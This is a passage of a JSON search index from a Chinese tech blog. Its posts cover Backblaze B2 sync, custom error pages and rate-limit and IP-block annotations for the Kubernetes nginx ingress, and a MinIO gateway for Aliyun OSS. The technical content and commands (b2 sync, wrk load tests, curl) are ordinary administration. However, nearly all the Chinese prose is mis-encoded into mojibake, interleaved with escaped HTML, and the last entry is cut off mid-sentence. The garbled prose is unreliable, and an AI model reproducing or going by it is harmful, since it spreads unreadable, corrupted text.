class=\"cl\"\u003eb2 sync --excludeDirRegex .git . b2://rendoumi/ \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå¥— Cloudflare å°±éšæ„äº†ã€‚full sslï¼Œå»ºä¸ª CNAME ä¸”ç”¨ Page rule åš url è½¬å‘å°±å¯ä»¥äº†ã€‚\u003c/p\u003e","title":"Backblazeç±»S3å…è´¹å…å¤‡æ¡ˆå¯¹è±¡å­˜å‚¨"},{"content":"kubernetesä¸‹å®šåˆ¶ http 50x ä»¥åŠ 40x æœåŠ¡å™¨è¿”å›ä¿¡æ¯çš„è¯ï¼Œå¦‚æœç”¨ Nginx åš ingressï¼Œå¤§å®¶ä¼šå¾ˆè‡ªç„¶æƒ³åˆ°ç›´æ¥ç”¨ nginx æ¥å®šåˆ¶ï¼š\nerror_page 500 502 503 504 /50x.html; location = /50x.html { root /export/html; } è¿™æ ·åšæ˜¯ä¸è¡Œçš„ï¼Œå› ä¸º Nginx ä½œä¸º ingress æ¥ä½¿ç”¨ï¼Œå°±ä¸èƒ½è½åœ°ï¼Œåªèƒ½åšè½¬å‘ï¼›å¦‚æœä½ è½åœ°äº†ï¼Œè®¿é—®äº†æœ¬åœ°æ–‡ä»¶ï¼Œå°±è¿èƒŒäº†åˆè¡·ã€‚è€Œä¸”åœ¨ ingress çš„ pod ä¸Šæ”¾é¡µé¢ï¼Œä¼šå¯¼è‡´ ingress çš„é…ç½®é”™ä¹±ã€‚\né‚£ä¹ˆæ­£ç¡® 50x é‡å®šä½çš„æ–¹æ³•å¦‚ä¸‹ï¼šé¦–å…ˆå»ºç«‹ä¸€ä¸ª deploy å’Œå¯¹åº”çš„ svcï¼Œå°±æ˜¯å»ºç«‹ä¸€ä¸ª web æœåŠ¡å™¨ï¼Œèƒ½æä¾›æœåŠ¡è¿”å› 50x å’Œ 40x çš„å®šåˆ¶é¡µé¢ï¼›ç„¶ååœ¨ ingress\nå†…æŒ‡å®š custom-http-errors å’Œ default-backend æŒ‡å‘å®ƒå°±å¯ä»¥äº†ã€‚\nä¸€ã€å»ºç«‹miniserveçš„deployå’Œsvc æˆ‘ä»¬é€‰ç”¨ rust çš„ miniserve ä½œä¸º web æœåŠ¡å™¨ï¼Œå‡†å¤‡å¥½å®šåˆ¶å¥½çš„ index.htmlï¼Œå†™ä¸ª Dockerfile\nç½‘å€ï¼šhttps://github.com/svenstaro/miniserve\nFROM alpine:3.12 RUN apk add --update bash \u0026amp;\u0026amp; rm -rf /var/cache/apk/* COPY . /data/ RUN rm -rf /data/Dockerfile WORKDIR /data EXPOSE 8080 CMD [\u0026#34;/data/miniserve\u0026#34;,\u0026#34;--index\u0026#34;,\u0026#34;index.html\u0026#34;] #CMD /bin/sh -c \u0026#34;while true; do echo hi; sleep 10; done\u0026#34; ä½œå‡ºé•œåƒåæ¨é€åˆ°é˜¿é‡Œé•œåƒï¼šregistry.cn-shanghai.aliyuncs.com/rendoumi/miniserve:lastest\nç„¶åå‡†å¤‡å¥½ deployå’Œ svcï¼Œéƒ¨ç½²åˆ° kubernetes é‡Œ\n--- apiVersion: apps/v1 kind: Deployment metadata: name: miniserve-deploy labels: app: miniserve spec: replicas: 1 selector: matchLabels: app: miniserve template: metadata: labels: app: miniserve spec: containers: - name: miniserve image: registry.cn-shanghai.aliyuncs.com/rendoumi/miniserve:lastest imagePullPolicy: Always ports: - containerPort: 8080 --- apiVersion: v1 kind: Service metadata: name: miniserve-svc labels: app: miniserve spec: ports: - name: http protocol: TCP port: 80 targetPort: 8080 selector: app: miniserve type: ClusterIP äºŒã€ä¿®æ”¹ingress ä¿®æ”¹çš„åœ°æ–¹å°±æ˜¯ annotations çš„æœ€åä¸¤è¡Œï¼š\napiVersion: networking.k8s.io/v1beta1 kind: Ingress metadata: name: kala-com-ingress annotations: kubernetes.io/ingress.class: \u0026#34;nginx\u0026#34; nginx.ingress.kubernetes.io/limit-connections: \u0026#34;2\u0026#34; nginx.ingress.kubernetes.io/limit-rpm: \u0026#34;2\u0026#34; nginx.ingress.kubernetes.io/limit-rps: \u0026#34;1\u0026#34; nginx.ingress.kubernetes.io/app-root: \u0026#34;/webui/\u0026#34; nginx.ingress.kubernetes.io/auth-type: basic nginx.ingress.kubernetes.io/auth-secret: kala-auth nginx.ingress.kubernetes.io/auth-realm: \u0026#39;Authentication Required - Kala\u0026#39; nginx.ingress.kubernetes.io/default-backend: \u0026#34;miniserve-svc\u0026#34; nginx.ingress.kubernetes.io/custom-http-errors: \u0026#34;403,404,500,502,503,504\u0026#34; spec: rules: - host: kala.rendoumi.com http: paths: - path: / backend: serviceName: kala-svc servicePort: 80 æµ‹è¯•çš„è¯ç”¨ wrk å‹ä½ï¼Œç„¶åcurlå†æµ‹å°±503è½¬åˆ°miniserve-svc\nwrk -c 3 -t 3 -d 10 http://kala.rendoumi.com/webui/ --latency curl -v -H \u0026#34;Host: kala.rendoumi.com\u0026#34; http://kala.rendoumi.com/webui/ ","permalink":"https://rendoumi.com/posts/20211129-kubernetes_custom_503/","summary":"\u003cp\u003ekubernetesä¸‹å®šåˆ¶ http 50x ä»¥åŠ 40x æœåŠ¡å™¨è¿”å›ä¿¡æ¯çš„è¯ï¼Œå¦‚æœç”¨ Nginx åš ingressï¼Œå¤§å®¶ä¼šå¾ˆè‡ªç„¶æƒ³åˆ°ç›´æ¥ç”¨ nginx æ¥å®šåˆ¶ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"na\"\u003eerror_page   500 502 503 504  /50x.html;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"na\"\u003elocation\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e/50x.html {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e            root   /export/html;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e        }\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè¿™æ ·åšæ˜¯ä¸è¡Œçš„ï¼Œå› ä¸º Nginx ä½œä¸º ingress æ¥ä½¿ç”¨ï¼Œå°±ä¸èƒ½è½åœ°ï¼Œåªèƒ½åšè½¬å‘ï¼›å¦‚æœä½ è½åœ°äº†ï¼Œè®¿é—®äº†æœ¬åœ°æ–‡ä»¶ï¼Œå°±è¿èƒŒäº†åˆè¡·ã€‚è€Œä¸”åœ¨ ingress çš„ pod ä¸Šæ”¾é¡µé¢ï¼Œä¼šå¯¼è‡´ ingress çš„é…ç½®é”™ä¹±ã€‚\u003c/p\u003e\n\u003cp\u003eé‚£ä¹ˆæ­£ç¡® 50x é‡å®šä½çš„æ–¹æ³•å¦‚ä¸‹ï¼šé¦–å…ˆå»ºç«‹ä¸€ä¸ª deploy å’Œå¯¹åº”çš„ svcï¼Œå°±æ˜¯å»ºç«‹ä¸€ä¸ª web æœåŠ¡å™¨ï¼Œèƒ½æä¾›æœåŠ¡è¿”å› 50x å’Œ 40x çš„å®šåˆ¶é¡µé¢ï¼›ç„¶ååœ¨ ingress\u003c/p\u003e\n\u003cp\u003eå†…æŒ‡å®š custom-http-errors å’Œ default-backend æŒ‡å‘å®ƒå°±å¯ä»¥äº†ã€‚\u003c/p\u003e\n\u003ch2 id=\"ä¸€å»ºç«‹miniserveçš„deployå’Œsvc\"\u003eä¸€ã€å»ºç«‹miniserveçš„deployå’Œsvc\u003c/h2\u003e\n\u003cp\u003eæˆ‘ä»¬é€‰ç”¨ rust çš„ miniserve ä½œä¸º web æœåŠ¡å™¨ï¼Œå‡†å¤‡å¥½å®šåˆ¶å¥½çš„ index.htmlï¼Œå†™ä¸ª Dockerfile\u003c/p\u003e\n\u003cp\u003eç½‘å€ï¼šhttps://github.com/svenstaro/miniserve\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eFROM alpine:3.12\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eRUN apk add --update bash \u0026amp;\u0026amp; rm -rf /var/cache/apk/*\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eCOPY . /data/\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eRUN    rm -rf /data/Dockerfile\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eWORKDIR /data\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eEXPOSE 8080\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eCMD [\u0026#34;/data/miniserve\u0026#34;,\u0026#34;--index\u0026#34;,\u0026#34;index.html\u0026#34;]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#CMD /bin/sh -c \u0026#34;while true; do echo hi; sleep 10; done\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä½œå‡ºé•œåƒåæ¨é€åˆ°é˜¿é‡Œé•œåƒï¼š\u003ccode\u003eregistry.cn-shanghai.aliyuncs.com/rendoumi/miniserve:lastest\u003c/code\u003e\u003c/p\u003e","title":"kubernetesä¸‹å®šåˆ¶æœåŠ¡å™¨503ä»¥åŠå…¶ä»–çš„403æ¶ˆæ¯"},{"content":"åœ¨ kubernetes ä¸­ï¼Œingress è´Ÿè´£è½¬å‘ã€èæ–­å’Œé™æµã€‚\næˆ‘ä»¬ä»¥ Nginx ingress ä¸ºä¾‹ï¼Œè®¨è®ºä¸€ä¸‹è¿™æ–¹é¢çš„é—®é¢˜ã€‚\nä¸€ã€Nginx ingressé»‘ç™½åå• è¿™ä¸ªå¾ˆç®€å•äº†ï¼Œä¸¢è¿›é»‘åå•æˆ–è€…ç™½åå•ï¼Œåœ¨å…¥å£å‰æ‹¦ä¸€åˆ€ã€‚\næˆ‘ä»¬åªè¦åœ¨ annotations å£°æ˜å³å¯ï¼š\napiVersion: networking.k8s.io/v1beta1 kind: Ingress metadata: name: www-com-ingress annotations: kubernetes.io/ingress.class: nginx nginx.ingress.kubernetes.io/ssl-redirect: \u0026#34;true\u0026#34; nginx.ingress.kubernetes.io/block-cidrs: a.b.c.d/32 #nginx.ingress.kubernetes.io/whitelist-source-range: a.b.c.d/32 spec: tls: - hosts: - www.huabbao.com secretName: www-huabbao-com-cert rules: - host: www.huabbao.com http: paths: - path: / backend: serviceName: nginx-svc æ³¨æ„ï¼Œå¤šä¸ªipçš„è¯ï¼Œä¹‹é—´ç”¨é€—å·éš”å¼€ï¼ˆè¯¥å€¼æ˜¯é€—å·åˆ†éš”çš„CIDRåˆ—è¡¨ï¼‰ ï¼š\nnginx.ingress.kubernetes.io/whitelist-source-range: \u0026#39;58.246.36.130,180.167.74.98,114.85.176.38â€™ äºŒã€Nginx ingressé™é€Ÿ é™é€Ÿè¿™ä¸ªé—®é¢˜æ¯”è¾ƒå¤æ‚ï¼Œé¦–å…ˆæˆ‘ä»¬éœ€è¦è€ƒè™‘åˆ°ç”¨æˆ·ä½“éªŒï¼Œå¦‚æœå¾ˆé²æ£’æ€§çš„å¼ºåˆ¶é™åˆ¶å®¢æˆ·ç«¯æµé‡æ˜¯10KBï¼Œé‚£ä¹ˆå¦‚æœä¸€å¼€å§‹çš„åŠ è½½é¡µé¢å¦‚æœè¾ƒå¤§ï¼Œå®¢æˆ·ç›´æ¥å°±ç¦»åœºäº†ã€‚æ‰€ä»¥é¦–å…ˆè¦è€ƒè™‘è¦æœ‰åˆå§‹å­—èŠ‚é‡ï¼Œè¿™ä¸ªé‡éœ€è¦èƒ½è®©å®¢æˆ·é¡ºç•…çš„æ‰“å¼€é¦–é¡µã€‚ç„¶åæˆ‘ä»¬å†è®¾å®šè¯·æ±‚é€Ÿç‡ï¼Œå†è€ƒè™‘å•ä¸ªIPåœ°å€çš„å¹¶å‘è¿æ¥é‡ï¼ˆå¹¶å‘é‡Ã—é€Ÿç‡=å®¢æˆ·ç«¯å®é™…é€Ÿç‡ï¼‰ï¼Œç¬¬å››ä¸ªå†è€ƒè™‘æ¯åˆ†é’Ÿæˆ–æ¯ç§’çš„æœ€å¤§è¯·æ±‚æ•°ã€‚\nä»¥ä¸‹æ³¨é‡Šå®šä¹‰æŒ‰é¡ºåºæ’åˆ—ï¼Œå¯ä»¥è®¾ç½®å•ä¸ªå®¢æˆ·ç«¯IPåœ°å€æ‰“å¼€çš„è¿æ¥çš„é™åˆ¶ï¼Œå¯ç”¨äºç¼“è§£DDoSæ”»å‡»ã€‚\nä¸€ã€nginx.ingress.kubernetes.io/limit-rate-afterï¼šè®¾ç½®åˆå§‹å­—èŠ‚é‡ï¼Œåœ¨æ­¤ä¹‹åï¼Œè¿›ä¸€æ­¥ä¼ è¾“å°†å—åˆ°limit-rateé€Ÿç‡é™åˆ¶ã€‚ äºŒã€nginx.ingress.kubernetes.io/limit-rateï¼šæ¯ç§’æ¥å—çš„è¯·æ±‚é€Ÿç‡ï¼ˆæ¯ç§’å­—èŠ‚æ•°ï¼‰ã€‚ ä¸‰ã€nginx.ingress.kubernetes.io/limit-connectionsï¼šæ¥è‡ªå•ä¸ªIPåœ°å€çš„å¹¶å‘è¿æ¥æ•°ã€‚ï¼ˆå¯ä»¥å»ºç«‹æœ€å¤§è¿æ¥æ•°ï¼‰ å››ã€nginx.ingress.kubernetes.io/limit-rpsï¼šæ¯ç§’å¯ä»ç»™å®šIPæ¥å—çš„è¿æ¥æ•°ã€‚ï¼ˆæ¯ä¸ªæº IP æ¯ä¸ªæº IP æ¯ç§’æœ€å¤§è¯·æ±‚æ¬¡æ•°ï¼‰ äº”ã€nginx.ingress.kubernetes.io/limit-rpmï¼šæ¯åˆ†é’Ÿå¯ä»ç»™å®šIPæ¥å—çš„è¿æ¥æ•°ã€‚ï¼ˆæ¯ä¸ªæº IP æ¯åˆ†é’Ÿæœ€å¤§è¯·æ±‚æ¬¡æ•°ï¼‰ å¯ä»¥æŒ‡å®š nginx.ingress.kubernetes.io/limit-whitelist è®¾ç½®ä»é€Ÿç‡é™åˆ¶ä¸­æ’é™¤çš„å®¢æˆ·ç«¯IPæºèŒƒå›´ï¼Œè¯¥å€¼ä¹Ÿæ˜¯é€—å·åˆ†éš”çš„CIDRåˆ—è¡¨ã€‚\nå¦‚æœåœ¨å•ä¸ªIngressè§„åˆ™ä¸­è®¾ç½®äº†å¤šä¸ªæ³¨é‡Š limit-rpmï¼Œåˆ™ limit-rps ä¼˜å…ˆã€‚\napiVersion: extensions/v1beta1 kind: Ingress metadata: name: my-ingress annotations: nginx.ingress.kubernetes.io/limit-rate-after: 500k nginx.ingress.kubernetes.io/limit-rate: 50k nginx.ingress.kubernetes.io/limit-connections: \u0026#34;3\u0026#34; nginx.ingress.kubernetes.io/limit-rps: \u0026#34;1\u0026#34; nginx.ingress.kubernetes.io/limit-rpm: \u0026#34;3\u0026#34; nginx.ingress.kubernetes.io/limit-whitelist: \u0026#34;192.168.7.0/24\u0026#34; spec: rules: - host: my.test.com http: paths: - path: / backend: serviceName: nginx servicePort: 80 è§£é‡Šä¸€ä¸‹ï¼š\né¦–å…ˆè®¾ç½®äº†åˆå§‹å­—èŠ‚é‡æ˜¯500k\nç„¶ååˆå§‹å­—èŠ‚é‡ç”¨å®Œä¹‹åï¼Œé™åˆ¶ç”¨æˆ·ä¼ è¾“é€Ÿç‡æ˜¯50k/s\néšåå¹¶å‘è¿æ¥è®¾ç½®ä¸º3ï¼Œé‚£ä¹ˆå®¢æˆ·ç«¯å¦‚æœåŒæ—¶æ‰“å¼€3ä¸ªè¿æ¥ï¼Œæ€»é€Ÿç‡æ˜¯ 50kÃ—3=150k/s\nç¬¬å››æ­¥è¿›ä¸€æ­¥è®¾ç½®äº†æ¯ç§’æœ€å¤§è¯·æ±‚æ¬¡æ•°æ˜¯1ï¼Œä¸‹é¢åˆè®¾ç½®æ¯åˆ†é’Ÿæœ€å¤§è¯·æ±‚æ¬¡æ•°æ˜¯3ã€‚\nç¬¬äº”æ­¥è®¾ç½®äº† 192.168.7.0/24 è¿™æ®µä¸å—é™é€Ÿçš„å½±å“\nè®¾ç½®å¥½ä»¥åå‹æµ‹è¯•ä¸€ä¸‹ï¼š\nè¶…é™è¿”å›çš„ä»£ç æ˜¯503\nwrk -c 3 -t 3 -d 10 http://m.test.com --latency curl -v -H \u0026#34;Host: m.test.com\u0026#34; http://m.test.com \u0026lt; HTTP/1.1 503 Service Temporarily Unavailable \u0026lt; Date: Wed, 28 Jul 2021 04:32:03 GMT \u0026lt; Content-Type: text/html \u0026lt; Content-Length: 190 \u0026lt; Connection: keep-alive HTTP/1.1 503 Service Temporarily Unavailable ","permalink":"https://rendoumi.com/posts/20211129-kubernetes_nginx_ingress_limit/","summary":"\u003cp\u003eåœ¨ kubernetes ä¸­ï¼Œingress è´Ÿè´£è½¬å‘ã€èæ–­å’Œé™æµã€‚\u003c/p\u003e\n\u003cp\u003eæˆ‘ä»¬ä»¥ Nginx ingress ä¸ºä¾‹ï¼Œè®¨è®ºä¸€ä¸‹è¿™æ–¹é¢çš„é—®é¢˜ã€‚\u003c/p\u003e\n\u003ch2 id=\"ä¸€nginx-ingressé»‘ç™½åå•\"\u003eä¸€ã€Nginx ingressé»‘ç™½åå•\u003c/h2\u003e\n\u003cp\u003eè¿™ä¸ªå¾ˆç®€å•äº†ï¼Œä¸¢è¿›é»‘åå•æˆ–è€…ç™½åå•ï¼Œåœ¨å…¥å£å‰æ‹¦ä¸€åˆ€ã€‚\u003c/p\u003e\n\u003cp\u003eæˆ‘ä»¬åªè¦åœ¨ annotations å£°æ˜å³å¯ï¼š\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211129102114725\" loading=\"lazy\" src=\"/posts/20211129-kubernetes_nginx_ingress_limit/image-20211129102114725.png\"\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003eapiVersion\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003enetworking.k8s.io/v1beta1 \u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003ekind\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eIngress \u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003emetadata\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003ewww-com-ingress \u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003eannotations\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e   \u003c/span\u003e\u003cspan class=\"nt\"\u003ekubernetes.io/ingress.class\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003enginx \u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e   \u003c/span\u003e\u003cspan class=\"nt\"\u003enginx.ingress.kubernetes.io/ssl-redirect\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"w\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e   \u003c/span\u003e\u003cspan class=\"nt\"\u003enginx.ingress.kubernetes.io/block-cidrs\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003ea.b.c.d/32 \u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e   \u003c/span\u003e\u003cspan class=\"c\"\u003e#nginx.ingress.kubernetes.io/whitelist-source-range: a.b.c.d/32 \u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003espec\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003etls\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e- \u003cspan class=\"nt\"\u003ehosts\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e   \u003c/span\u003e- \u003cspan class=\"l\"\u003ewww.huabbao.com \u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e   \u003c/span\u003e\u003cspan class=\"nt\"\u003esecretName\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003ewww-huabbao-com-cert \u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003erules\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e- \u003cspan class=\"nt\"\u003ehost\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003ewww.huabbao.com \u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e   \u003c/span\u003e\u003cspan class=\"nt\"\u003ehttp\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e     \u003c/span\u003e\u003cspan class=\"nt\"\u003epaths\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e     \u003c/span\u003e- \u003cspan class=\"nt\"\u003epath\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003e/ \u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e       \u003c/span\u003e\u003cspan class=\"nt\"\u003ebackend\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e         \u003c/span\u003e\u003cspan class=\"nt\"\u003eserviceName\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003enginx-svc \u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ³¨æ„ï¼Œå¤šä¸ªipçš„è¯ï¼Œä¹‹é—´ç”¨é€—å·éš”å¼€ï¼ˆè¯¥å€¼æ˜¯é€—å·åˆ†éš”çš„CIDRåˆ—è¡¨ï¼‰ ï¼š\u003c/p\u003e","title":"kubernetesä¸‹nginx ingressçš„é™åˆ¶"},{"content":"é˜¿é‡Œçš„äº‘çš„ OSS å¹¶ä¸æ˜¯å®Œå…¨ç‰ˆæœ¬çš„ AWS S3 å…¼å®¹ã€‚\næˆ‘ä»¬å¦‚æœéœ€è¦ç”¨ S3 åè®®è®¿é—® OSSï¼Œå°±æ¯”è¾ƒéº»çƒ¦äº†ã€‚\næ‰€ä»¥æ­å»ºä¸€ä¸ª minio æ¥åšç½‘å…³ï¼Œä»£ç†OSSï¼Œminio æ˜¯åŸºæœ¬å…¼å®¹S3çš„ï¼Œæ‰€ä»¥è¿™æ ·æ›²çº¿æ•‘å›½ï¼Œé€šè¿‡ S3 åè®®è®¿é—® minio æ¥è®¿é—®æœ€åç«¯çš„ OSS\nè¿™é‡Œè¿˜æœ‰ä¸€æ®µæ•…äº‹ï¼š\nMinio ä¸­é—´æœ‰ä¸€ç‰ˆæ˜¯æ”¯æŒ oss çš„ï¼Œä½†æ˜¯åæ¥ oss æ”¹äº†åè®®ï¼Œæ‰€ä»¥ç°åœ¨çš„æœ€æ–°ç‰ˆæœ¬ minio åè€Œæ˜¯ä¸æ”¯æŒä»£ç† oss 